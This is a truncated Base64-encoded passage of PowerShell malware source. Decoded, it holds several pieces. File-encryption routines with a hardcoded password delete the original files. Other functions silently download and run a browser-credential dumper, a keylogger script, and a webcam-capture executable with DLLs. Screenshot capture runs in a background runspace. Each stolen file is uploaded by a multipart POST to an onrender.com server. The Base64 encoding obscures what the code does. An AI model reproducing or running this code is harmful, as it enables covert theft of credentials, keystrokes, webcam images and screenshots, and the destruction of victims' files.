2FsdCA9IFtieXRlW11dQChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJTb21lUmFuZG9tU2FsdCIpKQogICAgJGl0ZXJhdGlvbnMgPSAxMDAwMAogICAgJGtleUxlbmd0aCA9IDMyICAjIEFFUy0yNTYKICAgICRpdkxlbmd0aCA9IDE2ICAgIyBBRVMgYmxvY2sgc2l6ZSAoMTI4IGJpdHMpCgogICAgIyBEZXJpdmluZyB0aGUga2V5IGFuZCBJViBmcm9tIHRoZSBwYXNzd29yZAogICAgJGtleURlcml2YXRpb24gPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmZjMjg5OERlcml2ZUJ5dGVzKCRwYXNzd29yZCwgJHNhbHQsICRpdGVyYXRpb25zKQogICAgJGFlc0tleSA9ICRrZXlEZXJpdmF0aW9uLkdldEJ5dGVzKCRrZXlMZW5ndGgpCiAgICAkYWVzSVYgPSAka2V5RGVyaXZhdGlvbi5HZXRCeXRlcygkaXZMZW5ndGgpCgogICAgIyBLZWVwIG9yaWdpbmFsIGV4dGVuc2lvbiBhbmQgYWRkICIuZW5jIgogICAgJGVuY3J5cHRlZEZpbGVQYXRoID0gIiRmaWxlUGF0aC5lbmMiCgogICAgdHJ5IHsKICAgICAgICAkYWVzID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCkKICAgICAgICAkYWVzLktleSA9ICRhZXNLZXkKICAgICAgICAkYWVzLklWID0gJGFlc0lWCiAgICAgICAgJGVuY3J5cHRvciA9ICRhZXMuQ3JlYXRlRW5jcnlwdG9yKCRhZXMuS2V5LCAkYWVzLklWKQoKICAgICAgICAjIE9wZW4gaW5wdXQvb3V0cHV0IHN0cmVhbXMKICAgICAgICAkZmlsZVN0cmVhbSA9IFtTeXN0ZW0uSU8uRmlsZV06Ok9wZW5SZWFkKCRmaWxlUGF0aCkKICAgICAgICAkZW5jcnlwdGVkU3RyZWFtID0gW1N5c3RlbS5JTy5GaWxlXTo6Q3JlYXRlKCRlbmNyeXB0ZWRGaWxlUGF0aCkKICAgICAgICAkY3J5cHRvU3RyZWFtID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNyeXB0b1N0cmVhbSgkZW5jcnlwdGVkU3RyZWFtLCAkZW5jcnlwdG9yLCBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DcnlwdG9TdHJlYW1Nb2RlXTo6V3JpdGUpCgogICAgICAgICMgUmVhZCAmIHdyaXRlIGluIGNodW5rcwogICAgICAgICRidWZmZXIgPSBOZXctT2JqZWN0IGJ5dGVbXSAxMDI0CiAgICAgICAgd2hpbGUgKCgkYnl0ZXNSZWFkID0gJGZpbGVTdHJlYW0uUmVhZCgkYnVmZmVyLCAwLCAkYnVmZmVyLkxlbmd0aCkpIC1ndCAwKSB7CiAgICAgICAgICAgICRjcnlwdG9TdHJlYW0uV3JpdGUoJGJ1ZmZlciwgMCwgJGJ5dGVzUmVhZCkKICAgICAgICB9CgogICAgICAgICRjcnlwdG9TdHJlYW0uQ2xvc2UoKQogICAgICAgICRmaWxlU3RyZWFtLkNsb3NlKCkKICAgICAgICAkZW5jcnlwdGVkU3RyZWFtLkNsb3NlKCkKCiAgICAgICAgIyBPcHRpb25hbGx5IHJlbW92ZSB0aGUgb3JpZ2luYWwgZmlsZQogICAgICAgIFJlbW92ZS1JdGVtIC1QYXRoICRmaWxlUGF0aCAtRm9yY2UKCiAgICAgICAgcmV0dXJuICJGaWxlIGVuY3J5cHRlZCBzdWNjZXNzZnVsbHk6ICRlbmNyeXB0ZWRGaWxlUGF0aCIKICAgIH0KICAgIGNhdGNoIHsKICAgICAgICByZXR1cm4gIkVycm9yIGR1cmluZyBlbmNyeXB0aW9uOiAkXyIKICAgIH0KfQoKZnVuY3Rpb24gRGVjcnlwdC1GaWxlV2l0aFBhc3N3b3JkIHsKICAgIHBhcmFtICgKICAgICAgICBbc3RyaW5nXSRmaWxlUGF0aAogICAgKQoKICAgICRwYXNzd29yZCA9ICJLQUtTREZLQUtTSkpGTjEyMWtrayMjIzEyNDkwMTAyMDQ5MTltbG1rYWtza2Zua2xhOTk5OSkpPz8iCgogICAgIyBHZW5lcmF0ZSBBRVMga2V5IGFuZCBJViBmcm9tIHRoZSBwYXNzd29yZCB1c2luZyBQQktERjIKICAgICRzYWx0ID0gW2J5dGVbXV1AKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIlNvbWVSYW5kb21TYWx0IikpCiAgICAkaXRlcmF0aW9ucyA9IDEwMDAwCiAgICAka2V5TGVuZ3RoID0gMzIgICMgQUVTLTI1NgogICAgJGl2TGVuZ3RoID0gMTYgICAjIEFFUyBibG9jayBzaXplICgxMjggYml0cykKCiAgICAjIERlcml2aW5nIHRoZSBrZXkgYW5kIElWIGZyb20gdGhlIHBhc3N3b3JkCiAgICAka2V5RGVyaXZhdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SZmMyODk4RGVyaXZlQnl0ZXMoJHBhc3N3b3JkLCAkc2FsdCwgJGl0ZXJhdGlvbnMpCiAgICAkYWVzS2V5ID0gJGtleURlcml2YXRpb24uR2V0Qnl0ZXMoJGtleUxlbmd0aCkKICAgICRhZXNJViA9ICRrZXlEZXJpdmF0aW9uLkdldEJ5dGVzKCRpdkxlbmd0aCkKCiAgICAkZGVjcnlwdGVkRmlsZVBhdGggPSAkZmlsZVBhdGggLXJlcGxhY2UgJ1wuZW5jJCcsICcnCgogICAgdHJ5IHsKICAgICAgICAkYWVzID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCkKICAgICAgICAkYWVzLktleSA9ICRhZXNLZXkKICAgICAgICAkYWVzLklWID0gJGFlc0lWCiAgICAgICAgJGRlY3J5cHRvciA9ICRhZXMuQ3JlYXRlRGVjcnlwdG9yKCRhZXMuS2V5LCAkYWVzLklWKQoKICAgICAgICAjIE9wZW4gdGhlIGVuY3J5cHRlZCBmaWxlIGZvciByZWFkaW5nIGFuZCBjcmVhdGUgYSBuZXcgZmlsZSBmb3Igd3JpdGluZyB0aGUgZGVjcnlwdGVkIGRhdGEKICAgICAgICAkZW5jcnlwdGVkU3RyZWFtID0gW1N5c3RlbS5JTy5GaWxlXTo6T3BlblJlYWQoJGZpbGVQYXRoKQogICAgICAgICRkZWNyeXB0ZWRTdHJlYW0gPSBbU3lzdGVtLklPLkZpbGVdOjpPcGVuV3JpdGUoJGRlY3J5cHRlZEZpbGVQYXRoKQogICAgICAgICRjcnlwdG9TdHJlYW0gPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ3J5cHRvU3RyZWFtKCRlbmNyeXB0ZWRTdHJlYW0sICRkZWNyeXB0b3IsIFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNyeXB0b1N0cmVhbU1vZGVdOjpSZWFkKQoKICAgICAgICAjIEJ1ZmZlciBmb3IgcmVhZGluZyBhbmQgd3JpdGluZyBkYXRhCiAgICAgICAgJGJ1ZmZlciA9IE5ldy1PYmplY3QgYnl0ZVtdIDEwMjQKICAgICAgICAkYnl0ZXNSZWFkID0gMAogICAgICAgIHdoaWxlICgoJGJ5dGVzUmVhZCA9ICRjcnlwdG9TdHJlYW0uUmVhZCgkYnVmZmVyLCAwLCAkYnVmZmVyLkxlbmd0aCkpIC1ndCAwKSB7CiAgICAgICAgICAgICRkZWNyeXB0ZWRTdHJlYW0uV3JpdGUoJGJ1ZmZlciwgMCwgJGJ5dGVzUmVhZCkKICAgICAgICB9CgogICAgICAgICRjcnlwdG9TdHJlYW0uQ2xvc2UoKQogICAgICAgICRlbmNyeXB0ZWRTdHJlYW0uQ2xvc2UoKQogICAgICAgICRkZWNyeXB0ZWRTdHJlYW0uQ2xvc2UoKQoKICAgICAgICAjIFJlbW92ZSB0aGUgZW5jcnlwdGVkIGZpbGUgYWZ0ZXIgZGVjcnlwdGlvbgogICAgICAgIFJlbW92ZS1JdGVtIC1QYXRoICRmaWxlUGF0aCAtRm9yY2UKCiAgICAgICAgcmV0dXJuICJGaWxlIGRlY3J5cHRlZCBzdWNjZXNzZnVsbHk6ICRkZWNyeXB0ZWRGaWxlUGF0aCIKICAgIH0KICAgIGNhdGNoIHsKICAgICAgICByZXR1cm4gIkVycm9yIGR1cmluZyBkZWNyeXB0aW9uOiAkXyIKICAgIH0KfQoKZnVuY3Rpb24gRmV0Y2gtQnJvd3NlckRhdGEgewogICAgIyBSdW4gdGhlIGR1bXAgKyB1cGxvYWQgZnVsbHkgaW4gYmFja2dyb3VuZCwgaGlkZGVuLCBhc3luYwoKICAgICRzY3JpcHQgPSB7CiAgICAgICAgJE91dHB1dFBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6VEVNUCwgInJlc3VsdC50eHQiKQoKICAgICAgICAjIERvd25sb2FkIGFuZCBwcmVwYXJlIHRoZSBzY3JpcHQKICAgICAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcjAwdC0zeHAxMGl0L3JlZHBpbGwvbWFpbi9saWIvRGV2aWNlR3VhcmQvSW52b2tlLVdEaWdlc3QucHMxIiAtT3V0RmlsZSAiJEVudjpUTVBcSW52b2tlLVdEaWdlc3QucHMxIgogICAgICAgIFVuYmxvY2stRmlsZSAtUGF0aCAiJEVudjpUTVBcSW52b2tlLVdEaWdlc3QucHMxIgoKICAgICAgICAjIFJ1biB0aGUgc2NyaXB0IHNpbGVudGx5LCByZWRpcmVjdCBvdXRwdXQgdG8gZmlsZQogICAgICAgIFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICJwb3dlcnNoZWxsLmV4ZSIgLUFyZ3VtZW50TGlzdCAiLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgYCIkRW52OlRNUFxJbnZva2UtV0RpZ2VzdC5wczFgIiAtYmFubmVyIGZhbHNlIC13ZGlnZXN0IGZhbHNlIC1icm93c2VyY3JlZHMiIC1XaW5kb3dTdHlsZSBIaWRkZW4gLVdhaXQgLVJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgJE91dHB1dFBhdGgKCiAgICAgICAgIyBSZW1vdmUgdGVtcCBzY3JpcHQKICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAiJEVudjpUTVBcSW52b2tlLVdEaWdlc3QucHMxIiAtRm9yY2UKCiAgICAgICAgIyBTZW5kIHRoZSBmaWxlIHRvIHRoZSBzZXJ2ZXIKICAgICAgICAjIFJlLWltcG9ydCBTZW5kLVRlbGVncmFtRmlsZSBmdW5jdGlvbiB0byB0aGlzIHJ1bnNwYWNlIChvciByZWRlZmluZSBpdCBoZXJlKQogICAgICAgIGZ1bmN0aW9uIFNlbmQtVGVsZWdyYW1GaWxlIHsKICAgICAgICAgICAgcGFyYW0oW3N0cmluZ10kZmlsZVBhdGgpCgogICAgICAgICAgICAkU0VSVkVSX1VSTCA9ICJodHRwczovL3hlbnYxLTlndmQub25yZW5kZXIuY29tIgogICAgICAgICAgICBpZiAoLW5vdCAoW1N5c3RlbS5JTy5QYXRoXTo6SXNQYXRoUm9vdGVkKCRmaWxlUGF0aCkpKSB7CiAgICAgICAgICAgICAgICAkZmlsZVBhdGggPSBKb2luLVBhdGggLVBhdGggKEdldC1Mb2NhdGlvbikuUGF0aCAtQ2hpbGRQYXRoICRmaWxlUGF0aAogICAgICAgICAgICB9CgogICAgICAgICAgICAkdXJpID0gIiRTRVJWRVJfVVJML2ZpbGVzIgogICAgICAgICAgICAkZmlsZU5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkZmlsZVBhdGgpCiAgICAgICAgICAgICRib3VuZGFyeSA9IFtTeXN0ZW0uR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpCiAgICAgICAgICAgICRMRiA9ICJgcmBuIgoKICAgICAgICAgICAgJGZpbGVDb250ZW50ID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRmaWxlUGF0aCkKCiAgICAgICAgICAgICRmaWVsZHMgPSAoCiAgICAgICAgICAgICAgICAiLS0kYm91bmRhcnkkTEYiICsKICAgICAgICAgICAgICAgICJDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9YCJkb2N1bWVudGAiOyBmaWxlbmFtZT1gIiRmaWxlTmFtZWAiJExGIiArCiAgICAgICAgICAgICAgICAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0kTEYkTEYiCiAgICAgICAgICAgICkKCiAgICAgICAgICAgICRlbmRCb3VuZGFyeSA9ICIkTEYtLSRib3VuZGFyeS0tJExGIgogICAgICAgICAgICAkYm9keUJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoJGZpZWxkcykgKyAkZmlsZUNvbnRlbnQgKyBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkZW5kQm91bmRhcnkpCgogICAgICAgICAgICAkcmVxdWVzdCA9IFtTeXN0ZW0uTmV0Lkh0dHBXZWJSZXF1ZXN0XTo6Q3JlYXRlKCR1cmkpCiAgICAgICAgICAgICRyZXF1ZXN0Lk1ldGhvZCA9ICJQT1NUIgogICAgICAgICAgICAkcmVxdWVzdC5Db250ZW50VHlwZSA9ICJtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0kYm91bmRhcnkiCiAgICAgICAgICAgICRyZXF1ZXN0LkNvbnRlbnRMZW5ndGggPSAkYm9keUJ5dGVzLkxlbmd0aAoKICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0gPSAkcmVxdWVzdC5HZXRSZXF1ZXN0U3RyZWFtKCkKICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uV3JpdGUoJGJvZHlCeXRlcywgMCwgJGJvZHlCeXRlcy5MZW5ndGgpCiAgICAgICAgICAgICRyZXF1ZXN0U3RyZWFtLkNsb3NlKCkKCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkcmVzcG9uc2UgPSAkcmVxdWVzdC5HZXRSZXNwb25zZSgpCiAgICAgICAgICAgICAgICAkcmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJHJlc3BvbnNlLkdldFJlc3BvbnNlU3RyZWFtKCkpCiAgICAgICAgICAgICAgICAkcmVhZGVyLlJlYWRUb0VuZCgpIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgICRyZWFkZXIuQ2xvc2UoKQogICAgICAgICAgICB9IGNhdGNoIHt9CiAgICAgICAgfQoKICAgICAgICBTZW5kLVRlbGVncmFtRmlsZSAtZmlsZVBhdGggJE91dHB1dFBhdGgKICAgIH0KCiAgICAjIFN0YXJ0IHRoZSBiYWNrZ3JvdW5kIGpvYgogICAgU3RhcnQtSm9iIC1TY3JpcHRCbG9jayAkc2NyaXB0IHwgT3V0LU51bGwKICAgICMgRG9udCB3YWl0IGZvciBpdCAtIHRoaXMgaXMgYXN5bmMKfQoKZnVuY3Rpb24gU3RhcnQtS2V5bG9nZ2VyIHsKICAgICMgRGVmaW5lIHRoZSBVUkwgd2hlcmUgdGhlIGtleWxvZ2dlciBzY3JpcHQgaXMgaG9zdGVkCiAgICAkdXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS93YWduZXIwMTIvd2FnbmVyL3JlZnMvaGVhZHMvbWFpbi9rZXkucHMxIgoKICAgICMgRGVmaW5lIHRoZSBwYXRoIHdoZXJlIHdlIHdpbGwgc2F2ZSB0aGUgZmlsZQogICAgJHRlbXBQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6Q29tYmluZSgkZW52OlRFTVAsICJ0ZXN0LnBzMSIpCgogICAgIyBEb3dubG9hZCB0aGUgZmlsZSB0byB0aGUgdGVtcCBwYXRoCiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJHRlbXBQYXRoCgogICAgIyBSdW4gdGhlIGRvd25sb2FkZWQgZmlsZSBzaWxlbnRseSAoaW4gdGhlIGJhY2tncm91bmQpCiAgICBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwuZXhlIC1Bcmd1bWVudExpc3QgIi1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlIGAiJHRlbXBQYXRoImAgLVdpbmRvd1N0eWxlIEhpZGRlbgp9CgpmdW5jdGlvbiBTdG9wLUtleWxvZ2dlciB7CiAgICAjIEdldCBhbGwgcnVubmluZyBQb3dlclNoZWxsIHByb2Nlc3NlcwogICAgJHBzUHJvY2Vzc2VzID0gR2V0LVByb2Nlc3MgcG93ZXJzaGVsbCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQoKICAgIGZvcmVhY2ggKCRwcm9jIGluICRwc1Byb2Nlc3NlcykgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgICMgQ2hlY2sgaWYgdGhlIGNvbW1hbmQgbGluZSBjb250YWlucyAidGVzdC5wczEiCiAgICAgICAgICAgICRjb21tYW5kTGluZSA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmlsdGVyICJQcm9jZXNzSWQgPSAkKCRwcm9jLklkKSIpLkNvbW1hbmRMaW5lCiAgICAgICAgICAgIGlmICgkY29tbWFuZExpbmUgLWxpa2UgIip0ZXN0LnBzMSoiKSB7CiAgICAgICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRwcm9jLklkIC1Gb3JjZQogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICMgSGFuZGxlIGFjY2VzcyBlcnJvcnMgc2lsZW50bHkKICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIFdlYmNhbUNhcHR1cmUgewogICAgJHRlbXBEaXIgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wUGF0aCgpCiAgICAkZXhlVXJsID0gImh0dHBzOi8vZ2l0aHViLmNvbS93YWduZXIwMTIvd2FnbmVyL3Jhdy9yZWZzL2hlYWRzL21haW4vdGVzdC5leGUiCiAgICAkZGxsMVVybCA9ICJodHRwczovL2dpdGh1Yi5jb20vd2FnbmVyMDEyL3dhZ25lci9yYXcvcmVmcy9oZWFkcy9tYWluL0FGb3JnZS5WaWRlby5kbGwiCiAgICAkZGxsMlVybCA9ICJodHRwczovL2dpdGh1Yi5jb20vd2FnbmVyMDEyL3dhZ25lci9yYXcvcmVmcy9oZWFkcy9tYWluL0FGb3JnZS5WaWRlby5EaXJlY3RTaG93LmRsbCIKCiAgICAkZXhlUGF0aCA9IEpvaW4tUGF0aCAkdGVtcERpciAidGVzdC5leGUiCiAgICAkZGxsMVBhdGggPSBKb2luLVBhdGggJHRlbXBEaXIgIkFGb3JnZS5WaWRlby5kbGwiCiAgICAkZGxsMlBhdGggPSBKb2luLVBhdGggJHRlbXBEaXIgIkFGb3JnZS5WaWRlby5EaXJlY3RTaG93LmRsbCIKCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRleGVQYXRoKSkgeyBJbnZva2UtV2ViUmVxdWVzdCAkZXhlVXJsIC1PdXRGaWxlICRleGVQYXRoIH0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJGRsbDFQYXRoKSkgeyBJbnZva2UtV2ViUmVxdWVzdCAkZGxsMVVybCAtT3V0RmlsZSAkZGxsMVBhdGggfQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkZGxsMlBhdGgpKSB7IEludm9rZS1XZWJSZXF1ZXN0ICRkbGwyVXJsIC1PdXRGaWxlICRkbGwyUGF0aCB9CgogICAgJGNhcHR1cmVkSW1hZ2VQYXRoID0gSm9pbi1QYXRoICR0ZW1wRGlyICJwaG90by5qcGciCiAgICBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZXhlUGF0aCAtV29ya2luZ0RpcmVjdG9yeSAkdGVtcERpciAtV2luZG93U3R5bGUgSGlkZGVuIC1XYWl0CgogICAgaWYgKFRlc3QtUGF0aCAkY2FwdHVyZWRJbWFnZVBhdGgpIHsKICAgICAgICBTZW5kLVRlbGVncmFtRmlsZSAtZmlsZVBhdGggJGNhcHR1cmVkSW1hZ2VQYXRoCiAgICAgICAgUmVtb3ZlLUl0ZW0gLVBhdGggJGNhcHR1cmVkSW1hZ2VQYXRoIC1Gb3JjZQogICAgfQp9CgpmdW5jdGlvbiBDYXB0dXJlLUFuZC1TZW5kLVNjcmVlbnNob3QgewogICAgcGFyYW0gKAogICAgICAgIFtzdHJpbmddJFNFUlZFUl9VUkwKICAgICkKCiAgICAjIENyZWF0ZSBhIG5ldyBydW5zcGFjZSBmb3IgYmFja2dyb3VuZCBleGVjdXRpb24KICAgICRydW5zcGFjZSA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkcnVuc3BhY2UuT3BlbigpCgogICAgJHBzID0gW1Bvd2VyU2hlbGxdOjpDcmVhdGUoKQogICAgJHBzLlJ1bnNwYWNlID0gJHJ1bnNwYWNlCgogICAgJHBzLkFkZFNjcmlwdCh7CgogICAgICAgIHBhcmFtKCRTRVJWRVJfVVJMKQoKICAgICAgICBmdW5jdGlvbiBTZW5kLVRlbGVncmFtRmlsZSB7CiAgICAgICAgICAgIHBhcmFtKFtzdHJpbmddJGZpbGVQYXRoKQoKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICgtbm90IChbU3lzdGVtLklPLlBhdGhdOjpJc1BhdGhSb290ZWQoJGZpbGVQYXRoKSkpIHsKICAgICAgICAgICAgICAgICAgICAkZmlsZVBhdGggPSBKb2luLVBhdGggLVBhdGggKEdldC1Mb2NhdGlvbikuUGF0aCAtQ2hpbGRQYXRoICRmaWxlUGF0aAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICR1cmkgPSAiJFNFUlZFUl9VUkwvZmlsZXMiCiAgICAgICAgICAgICAgICAkZmlsZU5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkZmlsZVBhdGgpCiAgICAgICAgICAgICAgICAkYm91bmRhcnkgPSBbU3lzdGVtLkd1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoKQogICAgICAgICAgICAgICAgJExGID0gImByYG4iCgogICAgICAgICAgICAgICAgJGZpbGVDb250ZW50ID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRmaWxlUGF0aCkKCiAgICAgICAgICAgICAgICAkZmllbGRzID0gKAogICAgICAgICAgICAgICAgICAgICItLSRib3VuZGFyeSRMRiIgKwogICAgICAgICAgICAgICAgICAgICJDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9YCJkb2N1bWVudGAiOyBmaWxlbmFtZT1gIiRmaWxlTmFtZWAiJExGIiArCiAgICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJExGJExGIgogICAgICAgICAgICAgICAgKQoKICAgICAgICAgICAgICAgICRlbmRCb3VuZGFyeSA9ICIkTEYtLSRib3VuZGFyeS0tJExGIgogICAgICAgICAgICAgICAgJGJvZHlCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRmaWVsZHMpICsgJGZpbGVDb250ZW50ICsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoJGVuZEJvdW5kYXJ5KQoKICAgICAgICAgICAgICAgICRyZXF1ZXN0ID0gW1N5c3RlbS5OZXQuSHR0cFdlYlJlcXVlc3RdOjpDcmVhdGUoJHVyaSkKICAgICAgICAgICAgICAgICRyZXF1ZXN0Lk1ldGhvZCA9ICJQT1NUIgogICAgICAgICAgICAgICAgJHJlcXVlc3QuQ29udGVudFR5cGUgPSAibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9JGJvdW5kYXJ5IgogICAgICAgICAgICAgICAgJHJlcXVlc3QuQ29udGVudExlbmd0aCA9ICRib2R5Qnl0ZXMuTGVuZ3RoCgogICAgICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0gPSAkcmVxdWVzdC5HZXRSZXF1ZXN0U3RyZWFtKCkKICAgICAgICAgICAgICAgICRyZXF1ZXN0U3RyZWFtLldyaXRlKCRib2R5Qnl0ZXMsIDAsICRib2R5Qnl0ZXMuTGVuZ3RoKQogICAgICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uQ2xvc2UoKQoKICAgICAgICAgICAgICAgICRyZXNwb25zZSA9ICRyZXF1ZXN0LkdldFJlc3BvbnNlKCkKICAgICAgICAgICAgICAgICRyZWFkZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlcigkcmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKSkKICAgICAgICAgICAgICAgICRyZWFkZXIuUmVhZFRvRW5kKCkgfCBPdXQtTnVsbAogICAgICAgICAgICAgICAgJHJlYWRlci5DbG9zZSgpCiAgICAgICAgICAgIH0gY2F0Y2gge30KICAgICAgICB9CgogICAgICAgIHRyeSB7CiAgICAgICAgICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMKICAgICAgICAgICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRHJhd2luZwoKICAgICAgICAgICAgIyBTZXQgcHJvY2VzcyBEUEkgYXdhcmVuZXNzCiAgICAgICAgICAgICRkcGlBd2FyZUNvZGUgPSBAIgp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnB1YmxpYyBjbGFzcyBOYXRpdmVNZXRob2RzIHsKICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0UHJvY2Vzc0RQSUF3YXJlKCk7Cn0KIkAKICAgICAgICAgICAgQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICRkcGlBd2FyZUNvZGUKICAgICAgICAgICAgW05hdGl2ZU1ldGhvZHNdOjpTZXRQcm9jZXNzRFBJQXdhcmUoKSB8IE91dC1OdWxsCgogICAgICAgICAgICAjIENhcHR1cmUgc2NyZWVuc2hvdAogICAgICAgICAgICAkYm91bmRzID0gW1N5c3RlbS5XaW5kb3dzLkZvcm1zLlNjcmVlbl06OlByaW1hcnlTY3JlZW4uQm91bmRzCiAgICAgICAgICAgICRiaXRtYXAgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLkJpdG1hcCAkYm91bmRzLldpZHRoLCAkYm91bmRzLkhlaWdodAogICAgICAgICAgICAkZ3JhcGhpY3MgPSBbU3lzdGVtLkRyYXdpbmcuR3JhcGhpY3NdOjpGcm9tSW1hZ2UoJGJpdG1hcCkKICAgICAgICAgICAgJGdyYXBoaWNzLkNvcHlGcm9tU2NyZWVuKFtTeXN0ZW0uRHJhd2luZy5Qb2ludF06OkVtcHR5LCBbU3lzdGVtLkRyYXdpbmcuUG9pbnRdOjpFbXB0eSwgJGJpdG1hcC5TaXplKQoKICAgICAgICAgICAgJHRpbWVzdGFtcCA9IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXlNTWRkX0hIbW1zcycKICAgICAgICAgICAgJHRlbXBGaWxlID0gSm9pbi1QYXRoIC1QYXRoIChbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wUGF0aCgpKSAtQ2hpbGRQYXRoICJzY3JlZW5zaG90XyR0aW1lc3RhbXAucG5nIgogICAgICAgICAgICAkYml0bWFwLlNhdmUoJHRlbXBGaWxlLCBbU3lzdGVtLkRyYXdpbmcuSW1hZ2luZy5JbWFnZUZvcm1hdF06OlBuZykKCiAgICAgICAgICAgICRncmFwaGljcy5EaXNwb3NlKCkKICAgICAgICAgICAgJGJpdG1hcC5EaXNwb3NlKCkKCiAgICAgICAgICAgIFNlbmQtVGVsZWdyYW1GaWxlIC1maWxlUGF0aCAkdGVtcEZpbGUKCiAgICAgICAgICAgIGlmIChUZXN0LVBhdGggJHRlbXBGaWxlKSB7CiAgICAgICAgICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAkdGVtcEZpbGUgLUZvcmNlCiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiU2NyZWVuc2hvdCBjYXB0dXJlIGZhaWxlZDogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgfQoKICAgIH0pLkFkZEFyZ3VtZW50KCRTRVJWRVJfVVJMKQoKICAgICMgQmVnaW4gYmFja2dyb3VuZCBleGVjdXRpb24KICAgICRudWxsID0gJHBzLkJlZ2luSW52b2tlKCkKCiAgICByZXR1cm4gIlNjcmVlbnNob3QgY2FwdHVyZSBzdGFydGVkIGluIGJhY2tncm91bmQuIgp9CgpmdW5jdGlvbiBHZXQtU3lzdGVtSW5mbyB7CiAgI